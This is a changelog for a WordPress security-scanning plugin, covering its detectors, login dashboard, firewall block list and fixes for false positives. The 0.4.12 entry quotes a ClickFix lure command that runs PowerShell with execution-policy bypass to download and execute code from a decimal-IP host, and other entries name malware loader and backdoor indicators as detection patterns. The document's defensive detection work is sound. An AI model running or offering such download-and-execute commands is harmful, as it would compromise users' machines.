# Changelog

## 0.4.14

- **A Logins box on the Dashboard.** Every successful login by anyone, not
  just administrators, by day for the last 14 days (UTC): logins, different
  people and administrator logins, plus the 10 busiest sites. It reads the
  event log Sentinel already writes for every login, and never alerts.
- 218 tests (was 217).

## 0.4.13

- **A block list on the Dashboard.** Every address with 5 or more failed
  logins in the last 14 days, and every L7 burst in that time, one per line
  to copy or download as `.txt` for a host or CDN firewall. A switch shows
  them as /24 ranges (IPv6 /64) instead, adding up each range's failures.
- **Held back, never listed:** anything inside the allowed networks, and
  any address or range an administrator has logged in from, shown below
  the list with the reason. A /24 is shared with strangers.
- **The failed-login count keeps repeat offenders for 14 days**, not just
  each day's busiest address. One-off failures still go after two days.
- 217 tests (was 213).

## 0.4.12

From Huntress's write-up of the ChatGPT Custom GPT ClickFix campaign
(September 2026). Its command, `"...\PowerShell.exe" -ExecutionPolicy
Bypass "irm 1614733393/12 | ..."`, raised F14 only with lure words around
it.

- **F14's strong terms ignore case.**
- **Two strong shapes:** PowerShell run with a flag however it is quoted,
  and a download from a host written as one decimal number (`irm
  1614733393/`, `http://1614733393`). Either alone makes F14 HIGH.
- 213 tests (was 210).

## 0.4.11

- **S4 sees any markup under a media name**, not only files that open
  with `<!DOCTYPE`, `<html` or `<script`. A lure fragment starting `<div`
  under a picture's name is now read like any other disguised page and is
  CRITICAL for what it carries.
- **`hasDemoPage` is an indicator only as a call, `hasDemoPage(`.** Cleanup
  tools name the bare word in a regex to remove the runtime (an uploads
  scanner, a browser kill switch in a theme's header scripts or a page),
  and the hourly page check reported the kill switch CRITICAL every
  minute. The runtime's ABI and its call both carry `hasDemoPage(`.
- 210 tests (was 206).

## 0.4.10

- **A web page saved under a picture's name is read before it is called
  CRITICAL.** S4 runs the content detectors over it (lure, loader,
  indicators, service worker). Carrying any of them at HIGH or above, it is
  CRITICAL and names them; carrying nothing, it is MEDIUM, a broken upload
  (old 404 pages, a saved page, a login page stored where an image or PDF
  should be). PHP or a zip under a picture's name is CRITICAL as before.
- 206 tests (was 204).

## 0.4.9

Two S3 false positives that fired HIGH on every affected site.

- **WordPress translation files** (`languages/**/*.l10n.php`, written by
  WordPress 6.5+) are not flagged when they only return an array of
  strings. The tokenizer checks it, without running it: one `return`, then
  only strings, numbers, null/true/false and array punctuation. A call, a
  variable, a second statement or text outside the tag and it is HIGH.
- **MailPoet's compiled template cache** (`uploads/mailpoet*/cache/<2
  hex>/<64 hex>.php` that starts as a Twig template class, from current or
  older MailPoet) is not flagged. Anything else in that folder still is.
- 204 tests (was 200).

## 0.4.8

From scoring the detectors against a second real infected backup (a
multisite, kept private: its files, database and a month of access logs).
0.4.6 found 9 of its 10 infected files; 0.4.8 finds all 10.

- **Big files are read whole.** A file over 1 MB used to be skipped, and
  the loader was appended to a 3.7 MB `fontawesome-all.min.js`. Now every
  file is read in 1 MB pieces that overlap by 64 KB, in the file walk and
  in the rendered-page check (which used to keep only the first MB of a
  served script). Memory stays at one piece.
- **F9 needs its three calls close together.** `atob(`, `new Function(`
  and `fromCharCode`/`charCodeAt` must sit within 32 KB of one another.
  Bundled libraries have all three by chance (dropzone 5.9.3 holds them
  80 KB apart); the loader keeps them within 8 KB.
- **F4 reads the key from `$_REQUEST` or `$_COOKIE`, by literal or through
  a variable.** A dropper that reads `$_REQUEST[$value]`, with its
  alphabet reordered and no comment prelude, used to fall to MEDIUM.
- **An attacker's network, not just its address.** A login or live session
  from the same /24 (IPv6 /64) as a listed address, or inside a listed
  CIDR, is HIGH (L1, D8). Six more addresses are listed.
- **The newer site-helper build**: eight hashes (F1 now also hashes files no
  content detector reads, such as a `restore.zip`), five strings from its
  Base-chain runtime, and a `plugin_dirs` list in `iocs.json`.
- **S10**: a plugin or theme directory named like a campaign plugin, by
  exact name or by site-helper's `<word>-<12 hex>`.
- **D11**: a campaign plugin active on any site or network-wide, with no
  baseline needed. D7 only sees what changed since a baseline, and one
  signed after a break-in holds these as normal.
- **F24**: PHP that includes an image file, the old "code in a .gif"
  backdoor.
- **S3** matches an allow-listed datastore under multisite upload paths
  (`uploads/sites/<n>/`, `blogs.dir/<n>/files/`) too, and no longer flags
  an empty PHP file (WP All Export leaves one in every site's uploads).
- 200 tests (was 179).

## 0.4.6

For the self-healing, cipher-obfuscated mu-plugin family Wordfence
documented in September 2026, and from scoring the detectors against a real
infected backup.

- **Two existing checks the family walked past.** D5 also compares the
  users table with a real `WP_User_Query` (the family hides its admin on
  `pre_user_query`, which `count_users()` never fires). L9 hashes top-level
  mu-plugins and the drop-ins every minute against the baseline.
- **Runtime checks obfuscation cannot reach.** L10 hook census (who is on
  the user-hiding and password hooks, by the file that registered them); L11
  outbound JSON-RPC `eth_*` calls through the HTTP API, naming the calling
  file; L2 an administrator's password set outside the lost-password flow;
  L12 cron schedules added since the baseline.
- **New static and stored checks.** F18 to F23, S8, S9, D1 family options
  and PHP stored as an option, D10 rogue-admin login shape. IOCs gain the
  family's contract selector and throttle names.
- **Fixed by the real-backup scan.** S1/S2 plant names of more than one word
  (nine decoys had walked past); F10 on a loader whose numeric array outruns
  4 KB (it had never fired on a real build); F23 matching SQL, not the word
  "update" (it fired on every copy of Akismet).
- **L6 counts only real REST requests.** A plugin looking users up
  internally while rendering a page fired the same filter; on one multisite
  that was 94% of all L6 hits, against the server's own address. The block
  setting now refuses only what L6 counts.
- **L13, the daily failed-login count**, on the Dashboard and in the digest;
  MEDIUM when a busy week goes silent.
- **Findings tab**: sortable columns, sorted in SQL; a detector filter;
  select-all in the header, shift-click ranges, click a row to toggle.
- **The rendered-page check skips archived, deactivated and spam sites**,
  and names them on the Dashboard; everything else still covers them.
- `bin/scan.php` and `bin/make-config.php` answer 404 outside the CLI; the
  config sample ships outside the zip's `mu-plugins/` folder.
- 179 tests (was 102).

## 0.3.0

First public release.

- Content detectors F1 to F17, file-system checks S1 to S7, database checks
  D1 to D9, live hooks L1 to L8, the rendered-page check P0 to P4.
- Chunked, resumable file walk that fits inside a one-minute cron.
- Signed baseline keyed from `wp-config.php` or the config file beside the
  loader; self-integrity every minute once signed.
- Findings with fingerprints, inert evidence copies, CSV and JSON export,
  bulk actions.
- Email, Teams Workflow (Adaptive Card) or Slack webhook, heartbeat on
  completion, daily digest, admin notices.
- Network and single-site installs from one bundle; per-site config
  generator; signature files replaceable from the settings page.
- 102 tests, no WordPress needed.
